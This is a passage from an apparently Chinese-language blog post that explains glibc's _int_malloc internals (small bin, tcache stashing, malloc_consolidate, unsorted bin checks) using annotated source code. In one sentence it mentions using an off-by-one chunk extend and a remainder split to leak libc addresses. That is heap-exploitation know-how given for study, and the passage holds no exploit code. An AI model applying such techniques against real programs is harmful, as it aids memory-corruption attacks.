(tc_victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (tc_victim);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先时根据大小获取目标small bin的idx，获取bin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br></pre></td></tr></table></figure><p>判断该bin是否为空，如果不为空则进一步进行一个取出的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">bck = victim-&gt;bk; <span class="comment">//victim是该bin中最末尾的chunk，然后bck是它在该bin中的前一个chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//判断指针是否有错误，这里判断bck的后向chunk是否为victim</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置inuse位</span></span><br><span class="line">bin-&gt;bk = bck; <span class="comment">//更改bin的前向与bck的后向。原本的victim被取出，bck变成了该bin中的最后一个chunk</span></span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim); <span class="comment">//设置no_main_arena位</span></span><br><span class="line">check_malloced_chunk (av, victim, nb);    </span><br></pre></td></tr></table></figure><p>然后就是对该small bin中剩下的chunk放入相应idx的tcache bin中,这个操作和之前的fastbin时的操作没有什么区别，只不过从单项链表变成了双向链表而已，以及多了一些chunk标志位的设置。这里不再赘述</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">      stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">        &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (tc_victim);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h6 id="large-bin阶段与malloc-consolidate"><a href="#large-bin阶段与malloc-consolidate" class="headerlink" title="large bin阶段与malloc_consolidate"></a>large bin阶段与malloc_consolidate</h6><p>当上面两个分支都不满足时，就进入了这个分支。如果有fastchunk的话，首先会进行一个<code>malloc_consolidate</code>操作，这个类似一个整理的过程，把碎片化的内存给合并起来，然后放入<code>unsorted bin</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc_consolidate</code>这个函数我们在分析free的时候也会用到，这里我们对它进行一个详细的分析。后面分析free的时候就一笔带过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);<span class="comment">//由于consolidate之后没有了fastchunks，所以设置av-&gt;have_fastchunks为false</span></span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);<span class="comment">//获取unsorted bin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>); <span class="comment">//fastbin数组的尾部</span></span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);<span class="comment">//fastbin数组的头部</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))<span class="comment">//检查对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<span class="comment">//检查该fastbin的chunk的size是否符合该bin的idx</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = REVEAL_PTR (p-&gt;fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = chunksize (p);</span><br><span class="line">nextchunk = chunk_at_offset(p, size); <span class="comment">//获取物理相邻的下一个chunk</span></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果物理相邻的上一个chunk不被使用，则进行一个合并</span></span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize; <span class="comment">//合并，size增大</span></span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//进行一个chunk的扩展，吞并上一个chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p); <span class="comment">//把上一个chunk从它属于的bin链表中unlink下来</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//如果后一个chunk不是top chunk</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果物理相邻的后一个chunk不被使用，则把后一个chunk也unlink下来</span></span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">  &#125; <span class="keyword">else</span><span class="comment">//否则的话就把后一个chunk的prev_inuse位置0，表示后一个chunk的前一个chunk(也就是当前chunk)不被使用</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd; <span class="comment">//把合并后的chunk放入unsoeted bin的首位</span></span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123; <span class="comment">//如果是large bin范围的size的话，还需要设置fd_nextsize等指针</span></span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;<span class="comment">//把合并后的chunk放入unsoeted bin的首位</span></span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是top chunk，则top chunk把前一个chunk 吞并</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);<span class="comment">//循环每链表中每一个元素</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//循环fastbinY数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致过程就如注释所写得，过程比较简单，就是一个对物理相邻的前后的chunk检查然后合并的过程</p><h6 id="unsorted-bin阶段"><a href="#unsorted-bin阶段" class="headerlink" title="unsorted bin阶段"></a>unsorted bin阶段</h6><p>其实注意到刚刚的分支并没有对我们想要的chunk进行一个检索，而只是获得了对应large bin的idx，然后把fastbin中的chunk给整理合并。后面才涉及到一个对unsorted bin以及large bin的一个检索的过程</p><p>首先是这个,获取nb对应的tcache bin的idx，如果tcache存在并且idx合理的话，把<code>tcache_nb</code>赋为<code>nb</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后就进入到了一个大循环<code>for(;;)</code>，<strong>其大致结构简要如下所示</strong> 。(后面应该会在int_malloc的开头或者总结中补一个类似这样的流程，以直观看代码结构)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>; <span class="comment">//循环最大次数</span></span><br><span class="line">    <span class="keyword">while</span>((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">//unsorted bin中进行搜索(其实不止在unsorted bin，后面会详细解释这个循环)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb)) <span class="comment">//large bin中进行搜索</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        ...<span class="comment">//binmap表等一系列操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    use_top:</span><br><span class="line">    ...<span class="comment">// 都没有找到合适的，到top chunk中进行切割</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先来看看<code>while((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</code>这个循环</p><p>首先是对victim物理相邻的属性以及在unsorted bin链表中的有效性进行了检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk; <span class="comment">//victim是unsorted bin中最后一个chunk，而bck是它的前一个</span></span><br><span class="line">size = chunksize (victim);</span><br><span class="line">mchunkptr next = chunk_at_offset (victim, size); <span class="comment">//next是victim物理相邻的下一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ) <span class="comment">//对victim的size大小进行一个检查</span></span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>); <span class="comment">//对victim的size大小进行一个检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <span class="comment">//对next的prev_size进行检查是否等于victim的size</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) <span class="comment">//对unsorted bin中的链表有效性进行检查，判断bck的fd是否是victim</span></span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) <span class="comment">//对unsorted bin中的链表有效性进行检查,判断victim的fd是不是unsorted bin头</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<span class="comment">//对next的prev_inuse进行检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而后进入这个判断，这是一个切割的过程。</p><p>如果我们请求的大小属于small bin范围，并且unsorted bin中只有victim一个chunk，并且victim是av-&gt;last_remainder，<strong>而且victim在被切成满足给用户请求大小的目标块后，剩余部分大于最小chunk的大小</strong>，就会进行一个切割操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">    only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">    runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">    exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">    no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb; <span class="comment">//获取切割后剩余块的大小</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb); <span class="comment">//获取剩余块</span></span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; <span class="comment">//将剩余块链入unsorted bin中</span></span><br><span class="line">    av-&gt;last_remainder = remainder;<span class="comment">// 设置 av-&gt;last_remainder = remainder为剩余块</span></span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); <span class="comment">//将剩余块链入unsorted bin中</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) <span class="comment">//如果剩余块大小属于large bin，则还需要设置字段</span></span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//设置一些属性</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="comment">//返回给用户</span></span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>顺便提一嘴，这个切割的操作是泄露libc的经典方法。比如我们利用off-by-one进行一个chunk extend，然后free掉放unsorted bin中，然后大切小，通过剩余的chunk泄露libc</p><p>然后是这个,把victim从unsorted bin中取出(我寻思着这个判断是不是多余了?前面不是判断过了吗)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>如果victim的大小刚刚好是我们想要的，则根据是否开启Tcache bin会有两种情况，一个是放入tcache中，设置return_cached为1，然后continue，在下一个循环中调用tcache_get取出，一个是直接返还给用户</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (size == nb)</span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">  We may return one of these chunks later.  */</span></span><br><span class="line">    <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>而后则是根据取出的这个victim的大小，将其放入对应的bin中</p><p>如果这个victim的size属于small bin范围,则会选定<code>bck</code>与<code>fwd</code>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index 